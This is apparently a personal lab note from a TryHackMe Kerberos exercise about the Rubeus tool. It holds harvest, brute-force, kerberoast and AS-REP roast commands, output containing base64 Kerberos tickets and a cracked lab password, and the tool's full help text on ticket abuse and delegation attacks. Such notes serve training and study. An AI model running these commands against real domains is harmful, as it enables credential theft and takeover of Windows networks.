
preinstalled in kali

https://github.com/GhostPack/Rubeus


ran on dc - harvest tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack (30 seconds)
`rubeus.exe harvest /interval:30`

`rubeus.exe brute /password:Password1 /noticket`

`rubeus.exe kerberoast /outfile:hashes.txt`

`rubeus.exe asreproast /outfile:hashes.txt`



### Examples

also [[../../../Boxes/TryHackMe/Attacking Kerberos/3 - rubeus examples|3 - rubeus examples]]

##### Harvest
```sh
C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (8/15/2025 11:26:28 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  8/15/2025 8:44:05 AM
  EndTime               :  8/15/2025 6:44:05 PM
  RenewTill             :  8/22/2025 8:44:05 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEjWz8N0SEson+vQ8zG7h/vjXXcQRqPxWI6zJ
    7uh4F20pzaEoR3fvJXygilqSGOr2cjija6uY82ZK/QVCBl/EGEKWauQ95bYq7VwxZNxz9kgWP9WSSExi/4efIhcDf8iJl5wVxd/o
    owYqRBYDdZ47MBWivqQMBzLUy2DjfMg6R2oP1mzlDjFtk/Cwso/O9fFGDPehS29y3Hzz0RHP8V1SFrk1B+8i23qvqxCAsvKL4rcV
    gaQ/YPuLLY4R+tt42JwicgP1CxW2cn7ByE3pQWtTC2WbObI2/+SCNIQncFJF0UvW8RuNSBQbBzegWMurk0ttfKaATdhY1De+GH2b
    IaDmqLc0PufGEMt1KpOutgV2Q5Y5GTUz4gKxmBTzhd57ffCyYMTreP++KQVUnJa7xE/N0V11Q4n3+WRyxdXbo4FSTqAVsflU/FAQ
    OPcYx9JX6T+AXiV63YePT+meA1s7LReYj35BXYd9Gz0c15TfAR+OXkB3auIfZ2r5xbqjrfqjP6hlKoOdWfPgVrpKvVtnRboEV1Qy
    a7YEmOLrke4ybNMfETelIPtaLEhjoUWW8hSVvZhQvaufG7IrfBAqF0t2n+r74tINOa8ziIegZbhKsxQcwJ1h6vI28GE3aDtYBeZx
    982PTg9tDDVkPGYyAazQYj+MAdjjoK/OFvMt2V9EkvkVuV0VlfdV6/RHAT4vk3H0hKxyBPGcqIPutc4B3CdYLcyBzsPxYNRgEvKt
    pv+B2vyz6ysnN2D/ka4vijTHQVNFBYNmaWjhtnzgru0V+JYjkycYhMx9L0ViyeJ0HffgAMv2pL9c6pfUlG3hGDQ8VsZ2aHrdzlc2
    YCKRmjL3EtQ7z83h33Kiadryk2OsEoTszikcj2MY3+em/raiuNYWKqVxvqN1N3ILDpTbbZ3sQ3krh7a8RvLso70W9C+HPKMYQpRC
    OPmkd7VUOkjZ/UazRCYQAEjzExI3lQR5nAKTGt7FgM7t0yJtDcjLVF7NMBHe8Nmsv163sDOhUREN2UYPFdcjg5S9ZdfqvETmFzNz
    TyXG38/ATnm76YtN0LMT181NCP/r1sYaW/RtAGEUDHzBzzOuBIjdbRdn/6t7b62OcGSx2H5EkcqG1f3Onqbb/o0la0ofa/gZxqme
    0SSJutY8eQetJDMkd2jg1VP2VFuMCNHikYMd6pEJIn5hwZuEDwkJgnm7eGEhvF3MfBlGvwEGKC5SS7QR76HIzfe+6j5cDTyQaVnc
    bN8nupPb2I85yv6D3gkh4BSE5du2eOK9s49Lcko7U6RnC7x7Cw9P/CRdyumIa5P0oZ7febxrzaPXkXX7sYBYXOVJZcTIL5D3cukl
    4V6NFdEH91zBWA/vYJUKKHt+cSWD8gKXfrc8Xw4m2VDZwgVQXqbRD0KjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCC9lYI3q1ZCOv9tRiCIF+d7tWTjP0pg72+X0sjQNhqwmqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI1MDgxNTE1NDQwNVqmERgPMjAyNTA4MTYwMTQ0MDVapxEYDzIwMjUwODIy
    MTU0NDA1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  8/15/2025 8:44:05 AM
  EndTime               :  8/15/2025 6:44:05 PM
  RenewTill             :  8/22/2025 8:44:05 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEsF2cwkto7yhiK9KeoENoeVxx6jpidHKtFAW
    eDhsqoRwfmMs2EnHU73YCHZIcgcEyNwahxK43wuP0x0vpIEWdjS7EtIekLZ2797X0xBj6DnQ5mGPBGpXMpQuQke50vl0gC9pWJph
    e29aSBKl73clXo4AgUurn9TTNzxg/aD2YdiFh38qJoYwKac995oUn+xGxihaXDy0DFkO13ft9LBO60NkLP9dro4P5RbA/omn28EN
    4q5KKadyKfcIi3Uu7fi0FX0VwKDygWAu5z6Uw9DXAzcVbCh2XDB4a9MgW8EkjLPlwLMHDAmcJJW/v3/0cSErhnKPhNJscGNQFxQc
    vwzc3S14bD1A+SvyrDOu7x4eegkvZPVzV+y9VG30ha1Cl9z9+Y9N0fGMD1T/cSHp8DWFcvLv5r9FDr7oRFvx6M+ls91FdDnaTOY4
    mX/5gCZY/mGZvhIc5v4YCgU1k7wS+Wb1adVU+Ttc0CQJwspadthXAPW24/dkddbkPwvWOSIVh83dQXYyQwztpcJlb2TepuxXyNZ0
    T6t08mVnOEuDKEl7BnRsGxMN4QENzz37Am3iBWYfJXNn4ZVqHvcJ9Pxz3XGwcV4fMuthrGyues1ocVT1DGKJCf+AG68p15Kk7E4p
    SK9SkdKOF343mGOPnPhmkNN9bxx6t4r14qq4otSCAD31g+KE9woU+WZfAJlaIvz02flZd8eNs2NpyFtMzyGqiPMSKsqEcF6mpobd
    x7l5bTDplCOmJJfkb6eNG9e9QCGts+vxSSX67QKl8NjCnwGPDCt+J97PcYTdbO6IMqFWzNVMhN2eattJskUBA6r4N2pr88vsQO9M
    qJUA/SwycaV2sW9brCcALPDnP7X5V3aaXKpmTymwtXYTEqfoDux3qhg+pfdgWfhNjBZroVyb/kmTXI9MuJdA6mKePPBbzSTjeObc
    AaoISwSdvCuZXTeRD3d3oZj+JYb2EHCrblpBqLWI3N7Dnslak72UK3v9lNvlVqIwEdoZB4piRvCmkvs2ktA1VbCTJyL1k/NePV5t
    zw4bKSjHJL8yPz5E2mKXU+tLrFC9tQ1Rer9dGP4hhlFLY1HJiWpOn22qR0IslOW9ATMSKyIDs1RMyzFrmLJqoSJ0iNkcH+6gMOg5
    2F8Lp7VX8tWvv59d8I6fIWFV2TiBD0CCz2rQ55uFPTY+uOghFJvI7BMwApgPuMrqY/BC038NsR4RaqW0Ht93OrB1A4HtOLK2ddU5
    YLeuhOk9zmPZb3C4eVwUKbF5qQwksmOd+AQ0+PMDo9s0nIJpKL8Z03vZsG/0w3wrM4HTMsUaP3Vee+RWyGcXq4f/TRVbBIQDu5cg
    9FY0tz0gscXC7zPbxI/seLmD0fwwCtH8NrELvy6RDnItWlvNMa+bhnejgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCBNJ0ZHSHLHQyNEWNJfbx6dPMNX1oZE0rlASyx1w27egqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDI1MDgxNTE1NDQwNVqmERgPMjAyNTA4MTYwMTQ0MDVapxEYDzIwMjUwODIy
    MTU0NDA1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  8/15/2025 10:58:44 AM
  EndTime               :  8/15/2025 8:58:44 PM
  RenewTill             :  8/22/2025 10:58:44 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
...
```

##### Brute
```sh
C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7WQFFxHdgfX4OL6cJ3sEJCpHF8yETikEi7sHP1ti2rG3fvGDaXch9s4H8p3K9xXGOmuOtEKqwNUV
      z1EoUeuxo8FkTUjQs9n0ACp+bYROG0PSv/21Psn6DSJ047qae5PwqOIuUrvbBQ79d6L/Vykz+JL0rk85
      6tGCYftO51AJ2gJNa1Z+g360Z29q/b0+JirT08qmFQI4Fk3XBfXcU+U8w8Am508idDrgcc7hT+vfn7oo
      hqnCSFJrWL8LdVw806xUZZmp8ADPnBm1RQcePkwZ1jFWxByNQ9kN8C7apvbWOzBkacV7bMrzmUx1Xx7R
      xgDc3Z/gbiURLpXHFfr5r49pGEJtq0Q06pg+Rm6yyKJYrk4r+9j+uDcbb/MS2EpdpHiW3kttEOhBlnrT
      I8bhLYJt0lbBbB8xJVyZ78hl9scIYymxgGbtHlnoHHSp/lOrHUnD4pRJryQXqLvieaVqFrq92Jdy+XBv
      rPcTFIzhS6iwP5+y845XmLt0CcUTZ1nqOUUaZuHxv1p4SiuUFyZtRcLobh8EwTP/rigkaHXDfJTPcgG0
      Gi42F3r1XQ3UJzdlUzaJZGSl3vfyr0ag9823zdkSnl/Gl7vn4cGchcrwVD7rBU7S4jQEJ3BJqg5trE6t
      paxnhjth9o7sHPUe+c3JWLpuyyXQcVS8FPS2m82NkhBREHQEn3jQ31G616xEs68jIL2CziSFIKxbEmPt
      6lz+xYWIsAhzM4FxbpCCnk6OHH+hak30Q4139LDN9G5JRSnoGV3URHqPvwLOMfk6udbr4yUIzHIHbPGK
      dHBzHiI+f/t+ALsF6AqAYuF+de7zqxGmYiIK9Jif1X2ZmhS8gjkPe2aS8MSlU46YDdNSObyB6XD36wRe
      YBorhnuVAXLDCb4lgQzGccDnT3K+48cKhM0+ya9baCTJJE7ncw66j7gKyy13V/yPjpm+oFPAZr4ZYJVS
      +P5JEC/swRvaCQOVqdJunBiQ5ebmdJBWNk7c3RGIeI7kNpR06zuvKjBNvn/7xqkI5Fz4NVTkUesYDpIW
      1w9QQTWhBI7afp99IxKa3RoutDEcOXYFCTirHsl/8qRdv+JCc8tsx7I1GxOOF/ixKRwESknSt5hlevw8
      gxRB57/w0eUFzyPsXhkDk37oC4NrSKGUggeHt9rYcQeQ6D7MTcWg9i8joWPJYqcs66XTOr3cqbqMq4Rh
      NhiHGu8+2av7jKq/OWh4IbTLYZtz+G2D+6YYozVkFM9VDrKDf7iO2no8CAj0HT1UU3Vm/ADwvxuOoqVr
      iztDIltbSZNDcsMmKa921ChmdnrjyjVfGraoYJ29Gg2TYbo/L+f2RX11fwGmHtEuu6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEII+SlIXGITWvda8sPwiy1cZMJOzHt6VFM6PY
      bmb0RXtuoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI1MDgxNTIwMDk0MFqmERgPMjAyNTA4MTYwNjA5NDBapxEYDzIwMjUwODIyMjAwOTQwWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs


 
[+] Done
```

### Help

```sh
C:\Users\Administrator\Downloads>rubeus

   ______        _
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]      

    Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]

    Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]

    Perform a Kerberos-based password bruteforcing attack:
        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]


 Constrained delegation abuse:

    Perform S4U constrained delegation abuse:
        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]

    Perform S4U constrained delegation abuse across domains:
        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap]


 Ticket management:

    Submit a TGT, optionally targeting a specific LUID (if elevated):
        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]

    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated): 
        Rubeus.exe purge [/luid:LOGINID]

    Parse and describe a ticket (service ticket or TGT):
        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>


 Ticket extraction and harvesting:

    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service: 
        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]

    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:
        Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]

    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]

    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
        Rubeus.exe tgtdeleg [/target:SPN]

    Monitor every /interval SECONDS (default 60) for new TGTs:
        Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]

    Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):
        Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]


 Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast /spn:"blah/blah" </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts: 
        Rubeus.exe kerberoast /usetgtdeleg [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/nowrap]

    Perform AS-REP "roasting" for any users without preauth:
        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]

    Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]

    Perform AS-REP "roasting" for any users without preauth using alternate credentials:
        Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/nowrap]


 Miscellaneous:

    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
        Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]

    Reset a user´s password from a supplied TGT (AoratoPw):
        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]

    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:
        Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]

    Substitute an sname or SPN into an existing service ticket:
        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap]
        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap] 

    Display the current user´s LUID:
        Rubeus.exe currentluid

    The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.

    The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.


 NOTE: Base64 ticket blobs can be decoded with :

    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
```
